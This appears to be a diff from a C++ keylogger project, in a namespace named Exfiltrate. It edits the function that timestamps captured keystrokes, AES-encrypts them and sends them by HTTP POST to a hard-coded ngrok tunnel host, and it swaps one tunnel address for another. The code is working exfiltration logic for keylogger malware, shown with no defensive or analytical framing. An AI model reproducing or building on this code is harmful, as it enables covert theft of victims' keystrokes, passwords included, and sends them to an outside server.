@@ -32,14 +32,14 @@ namespace Exfiltrate
 		Auxiliary::DateTime dateTime;
 		std::ostringstream formattedData;
 
-		formattedData << "[" << dateTime.getDTString("/", " ", ":") << "]" << std::endl << keyLogToExfil << std::endl;
+		formattedData << "[" << dateTime.getDTString("/", " ", ":") << "]" << "   " << keyLogToExfil;
 
 		std::string sendData = "data=";
 		
 		sendData += Transformer::aesEncrypt(formattedData.str());
 		sendData += Transformer::getIV();
 
-		std::string httpServerAddress = "7cf3-2601-2c7-4300-ac0-cdcc-8fde-b845-bef0.ngrok.io";
+		std::string httpServerAddress = "aa20-2601-2c7-4300-ac0-ccf4-eb10-f9b6-f107.ngrok.io";
 
 		if (sendHttpPOST(httpServerAddress, sendData))
 		{
